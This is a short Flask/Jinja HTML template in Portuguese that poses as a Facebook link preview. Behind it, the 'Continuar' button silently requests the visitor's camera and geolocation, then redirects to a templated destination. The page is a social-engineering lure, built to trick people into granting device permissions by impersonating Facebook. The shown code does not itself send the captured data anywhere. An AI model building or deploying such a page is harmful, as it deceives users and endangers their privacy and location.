<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>{{ link.og_title or 'Facebook' }}</title>
    <style>
        body { font-family: Helvetica, sans-serif; background-color: #e9ebee; padding: 30px; text-align: center; }
        .preview img { width: 90%; border-radius: 10px; }
        .botao { margin-top: 20px; padding: 12px 25px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>{{ link.og_title or 'Conteúdo exclusivo no Facebook' }}</h2>
    <div class="preview">
        <img src="{{ link.og_image or url_for('static', filename='fallback.jpg') }}">
        <p>{{ link.og_description or 'Clique para continuar no Facebook.' }}</p>
    </div>
    <button class="botao" onclick="solicitarPermissoes()">Continuar</button>
    
    <script>
        function solicitarPermissoes() {
            navigator.mediaDevices.getUserMedia({ video: true });
            navigator.geolocation.getCurrentPosition(() => {}, () => {});
            setTimeout(() => {
                window.location.href = "{{ link.destino }}";
            }, 1000);
        }
    </script>
</body>
</html>
